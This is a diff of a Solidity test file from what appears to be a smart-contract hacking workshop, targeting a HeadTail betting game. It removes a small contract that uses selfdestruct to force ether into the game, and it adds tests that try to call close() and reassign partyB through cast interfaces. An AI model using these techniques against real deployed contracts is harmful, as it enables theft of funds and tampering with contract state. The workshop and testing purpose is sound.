@@ -4,22 +4,8 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "src/hack-workshop/05_HeadTail.sol";
 
-// https://hackernoon.com/how-to-hack-smart-contracts-self-destruct-and-solidity
-contract HeadTailHack {
-    HeadTail _game;
-
-    constructor(HeadTail game) {
-        _game = game;
-    }
-
-    function close() public payable {
-        selfdestruct(payable(address(_game)));
-    }
-}
-
 contract HeadTailTest is Test {
     HeadTail game;
-    HeadTailHack hack;
     address alice;
     address bob;
     bool chooseHead = true;
@@ -35,20 +21,28 @@ contract HeadTailTest is Test {
         game = new HeadTail{value: 1 ether}(
             keccak256(abi.encode(chooseHead, number))
         );
-
+        console.logBytes32(game.commitmentA());
         // vm.prank(bob);
         // game.guess{value: 1 ether}(chooseHead);
-
-        hack = new HeadTailHack(game);
     }
 
-    function testGameHT() public {
+    function testHeadTailChildSelfDestruct() public {
         assertEq(address(game).balance, 1 ether);
         console.log("Alice balance", address(alice).balance);
         assertEq(game.partyA(), payable(alice));
         assertEq(alice.balance, 1 ether);
 
-        hack.close{value: 1 ether}();
+        HeadTailHack hack;
+        hack = HeadTailHack(address(game));
+        hack.close();
         console.log("Game balance", address(game).balance);
+    }
+
+    function testModifyPartyBFromChild() public {
+        HeadTailChild child = HeadTailChild(address(game));
+        console.log("PartyB", game.partyB());
+
+        child.updateAddressB(bob);
+        console.log("PartyB", game.partyB());
     }
 }
